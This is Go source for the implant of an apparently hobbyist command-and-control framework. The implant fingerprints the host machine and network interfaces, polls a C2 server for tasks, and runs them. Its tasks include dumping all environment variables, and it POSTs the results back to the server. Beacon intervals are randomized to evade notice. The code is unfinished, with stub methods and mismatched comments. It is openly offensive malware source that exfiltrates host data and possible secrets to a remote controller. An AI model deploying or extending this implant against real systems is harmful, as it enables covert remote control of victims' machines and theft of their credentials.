package main

import (
	"bytes"
	"crypto/md5" // #nosec G501 -- This import isn't needed for functions that need to be cryptographically secure
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/denisbrodbeck/machineid"
	"github.com/google/uuid"
	"github.com/thecloudnativehacker/kagec2/server/pkg/models"
	"golang.org/x/sys/unix"
)

type Agent interface {
	Beacon() error
	SetMeanDwell(f float64)
	GetTasks() error
	ServiceTasks() error
	SendResults() error
	SendTaskHistory() error
	GetMachineInfo() error
}

type thisImplant struct {
	models.Implant
}

func (i *thisImplant) Beacon() error {
	//get tasks and send machine info
	return nil
}

// set the time for the implant to sleep in between requests, uses randomized
// interval to be less obvious
func (i *thisImplant) SetMeanDwell(f float64) error {
	if f == 0 {
		return errors.New("Can't divide by 0")
	}
	i.DwellDistributionSeconds = rand.ExpFloat64() / f
	return nil
}

// Gets the tasks from the C2server for this implant
func (i *thisImplant) GetTasks() error {
	reqURL := "http://" + i.C2Host + i.C2Port + i.C2TasksURI + "?agent_id=" + i.Id.String()
	resp, err := i.Client.Get(reqURL)
	if err != nil {
		return err
	}
	t := []models.Task{}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	log.Println(reqURL)
	log.Println(string(body))
	err = json.Unmarshal(body, &t)
	if err != nil {
		return err
	}
	log.Println(t)
	*i.Tasks = append(*i.Tasks, t...)
	defer resp.Body.Close()
	return nil
}

func (i *thisImplant) ServiceTasks() error {
	//for each task need to run the task get the results
	//send results and ensure the task gets removed from list of tasks to run
	//i'm thinking move it over to task history and then delete the task from
	//implant and from the api
	// i think eventually the task and result and task history reconciliation
	// should all be done server side, limit how much is sent from implant.
	taskHistory := []models.TaskHistory{}
	for index, task := range *i.Tasks {
		r, err := i.runTask(task)
		if err != nil {
			//should send error taskhistory/results and remove task so we don't
			//loop
			*i.Tasks = append((*i.Tasks)[:index], (*i.Tasks)[index+1:]...)
			// return err
		}
		//append result append taskhistory and send both after loop completion
		*i.Results = append(*i.Results, r)
		taskH := models.TaskHistory{TaskObject: task, TaskResult: r}
		taskHistory = append(taskHistory, taskH)
	}
	//send results delete task send taskhistory
	err := i.SendResults()
	if err != nil {
		return err
	}
	err = i.SendTaskHistory()
	if err != nil {
		return err
	}
	i.Tasks = &[]models.Task{}
	i.Results = &[]models.Result{}
	return nil
}

func (i *thisImplant) runTask(t models.Task) (models.Result, error) {
	log.Printf("Running task %v", t)

	switch t.Type {
	case "create_file":
		f, err := os.Create("test.txt")
		r := models.Result{}
		r.AgentId = i.Id
		r.TaskId = t.Id
		if err != nil {
			r.Contents = "Could not create file"
			return r, errors.New("Could not create file")
		}
		defer f.Close()
		r.Contents = "File created successfully."
		return r, nil
	case "get_env":
		//just gets clipboard text for now
		r := models.Result{}
		r.AgentId = i.Id
		r.TaskId = t.Id
		contents := unix.Environ()
		if contents == nil {
			r.Contents = "Could not"
		}
		r.Contents = strings.Join(contents, "|")
		log.Println(r.Contents)
		return r, nil
	default:
		return models.Result{}, errors.New("No such task type found. " + t.Type)
	}

}

func (i *thisImplant) SendResults() error {
	reqURL := "http://" + i.C2Host + i.C2Port + i.C2ResultsURI + "?agent_id=" + i.Id.String()
	for _, res := range *i.Results {
		data, err := json.Marshal(res)
		log.Println(res.Contents)
		if err != nil {
			return err
		}
		_, err = i.Client.Post(reqURL, "application/json", bytes.NewBuffer(data))
		if err != nil {
			return err
		}
	}
	return nil
}

func (i *thisImplant) SendTaskHistory() error {
	return nil
}
func (i *thisImplant) GetMachineInfo() error {
	i.Info.OS = runtime.GOOS
	i.Info.Arch = runtime.GOARCH
	u, _ := user.Current()
	i.Info.CurrentUId = u.Uid
	i.Info.CurrentGId = u.Gid
	i.Info.Hostname, _ = os.Hostname()
	i.Info.PID = os.Getpid()
	i.Info.CurrentUser = u.Username
	i.Info.Interfaces = make(map[string]map[string][]string)

	//get all interfaces ip addr is key mac is value
	// may want interface name as well
	interfaces, _ := net.Interfaces()
	for _, inter := range interfaces {
		name := inter.Name
		hwAddr := inter.HardwareAddr.String()
		i.Info.Interfaces[name] = map[string][]string{hwAddr: []string{}}
		ips := i.Info.Interfaces[name][hwAddr]
		if addrs, err := inter.Addrs(); err == nil {
			for _, addr := range addrs {
				ips = append(ips, addr.String())
			}
			i.Info.Interfaces[name][hwAddr] = ips
		}
	}
	return nil
}

var implant thisImplant

const (
	C2Host       = "127.0.0.1"
	C2Port       = ":1323"
	C2TasksURI   = "/api/tasks/"
	C2ResultsURI = "/api/results/"
	MeanDwell    = 5.0
)

func init() {
	implant.Running = true
	err := implant.SetMeanDwell(MeanDwell)
	if err != nil {
		log.Println(err)
	}
	implant.C2Host = C2Host
	implant.C2Port = C2Port
	implant.C2TasksURI = C2TasksURI
	implant.C2ResultsURI = C2ResultsURI
	implant.Tasks = &[]models.Task{}
	implant.Results = &[]models.Result{}
}

func main() {
	//want to change this uuid generation to something deterministic based on the
	//machine https://gist.github.com/PaulBradley/08598aa755a6845f46691ab363ddf7f6
	id, _ := machineid.ID()
	md5hash := md5.New() // #nosec G401 -- This is only used for determining a UUID, this does not need to be cryptographically secure
	md5hash.Write([]byte(id))
	md5string := hex.EncodeToString(md5hash.Sum(nil))
	implantuuid, err := uuid.FromBytes([]byte(md5string[0:16]))
	if err != nil {
		log.Println(err)
	}
	implant.Id = implantuuid
	err = implant.GetMachineInfo()
	if err != nil {
		log.Println(err)
	}
	log.Println(implant)
	err = implant.GetTasks()
	if err != nil {
		log.Println(err)
	}
	// log.Println(implant)
	log.Println(implant.Tasks)
	err = implant.ServiceTasks()
	if err != nil {
		log.Println(err)
	}
}
